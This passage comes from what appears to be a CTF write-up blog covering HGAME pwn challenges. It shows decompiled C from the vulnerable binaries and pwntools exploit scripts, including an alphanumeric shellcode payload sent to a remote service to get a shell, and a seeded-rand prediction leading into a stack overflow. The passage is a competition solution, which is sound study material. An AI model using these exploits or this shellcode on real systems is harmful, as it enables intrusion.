punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v5 <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1LL</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input the length of your shellcode:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%2d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v4 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input your shellcode:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">myread</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"too long\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token function\">v5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 __fastcall <span class=\"token function\">myread</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token keyword\">char</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Fh] [rbp-11h]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+24h] [rbp-Ch]</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v5<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>a1 <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">96</span> <span class=\"token operator\">||</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">122</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">64</span> <span class=\"token operator\">||</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">90</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">47</span> <span class=\"token operator\">||</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">57</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid character\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token keyword\">return</span> v6 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'47.100.137.175'</span><span class=\"token punctuation\">,</span><span class=\"token number\">32468</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = process('./pwn')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote 51914aa91c52b27b3e1cc4bcec934fecfa3dff6c\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"elden-random-challenge100pt\"><a class=\"markdownIt-Anchor\" href=\"#elden-random-challenge100pt\">#</a> Elden Random Challenge(100pt)</h3>\n<blockquote>\n<p>rrrrraaaannnnndddddoooommmm</p>\n</blockquote>\n<p>随机数挑战，以 0 为种子去发送 99 次随机数即可</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-18h] BYREF</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Eh] [rbp-12h] BYREF</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> seed<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  seed <span class=\"token operator\">=</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Menlina: Well tarnished, tell me thy name.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x12uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I see,%s\"</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Now the golden rule asks thee to guess ninety-nine random number. Shall we get started.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">98</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    v6 <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please guess the number:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v4<span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v6 <span class=\"token operator\">!=</span> v4 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token operator\">++</span>i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Here's a reward to thy brilliant mind.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token function\">myread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token class-name\">ssize_t</span> <span class=\"token function\">myread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-30h] BYREF</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x100uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = remote('47.100.137.175',30918)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'/home/yhuan/Desktop/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span 